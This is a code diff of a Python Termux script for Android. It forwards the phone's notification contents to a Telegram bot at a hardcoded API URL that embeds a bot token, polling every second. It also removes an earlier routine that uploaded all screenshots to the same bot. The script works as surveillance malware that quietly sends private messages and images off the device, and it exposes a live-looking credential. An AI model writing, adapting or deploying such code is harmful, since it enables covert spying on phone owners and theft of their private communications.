@@ -2,7 +2,6 @@ import os
 import time
 import requests
 import subprocess
-import datetime
 
 # Telegram Bot API settings
 TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
@@ -28,15 +27,6 @@ def send_telegram_photo(photo_path):
         response = requests.post(f"https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendDocument", data=data, files=files)
         return response.json()
 
-def get_screenshots():
-    """Get all screenshot files from the screenshot directory"""
-    screenshots = []
-    for root, dirs, files in os.walk(SCREENSHOT_DIR):
-        for file in files:
-            if file.lower().endswith(('.png', '.jpg', '.jpeg')):  # Adjust if necessary
-                screenshots.append(os.path.join(root, file))
-    return screenshots
-
 def capture_notifications():
     """Capture notifications using termux-notification-list"""
     try:
@@ -58,21 +48,28 @@ def capture_notifications():
         print(f"Error capturing notifications: {e.output.decode()}")
 
 def main():
+    # Keep checking for new notifications
+    last_notification = None
     while True:
-        # Capture notifications every 5 minutes (300 seconds)
-        capture_notifications()
+        try:
+            result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT)
+            notifications = result.decode('utf-8').splitlines()
 
-        # Get all screenshots in the directory and send them once a day
-        screenshots = get_screenshots()
-        if screenshots:
-            for screenshot in screenshots:
-                # Send each screenshot to Telegram
-                send_telegram_photo(screenshot)
-                print("Telegram sent")  # Simplified message
+            # Compare with the last sent notification
+            if notifications and notifications != last_notification:
+                last_notification = notifications
+                message = "Notifications:\n\n"
+                for notification in notifications:
+                    if "App:" in notification and "Title:" in notification and "Text:" in notification:
+                        message += f"{notification}\n\n"
+                if message.strip() != "Notifications:\n\n":
+                    send_telegram_message(message)
+                    print("New notification sent to Telegram.")
 
-        # Wait for the next day (24 hours)
-        print(f"Waiting until next day...")
-        time.sleep(86400)  # Sleep for 24 hours (86400 seconds)
+        except subprocess.CalledProcessError as e:
+            print(f"Error capturing notifications: {e.output.decode()}")
+
+        time.sleep(1)  # Check every second for new notifications
 
 if __name__ == "__main__":
     main()
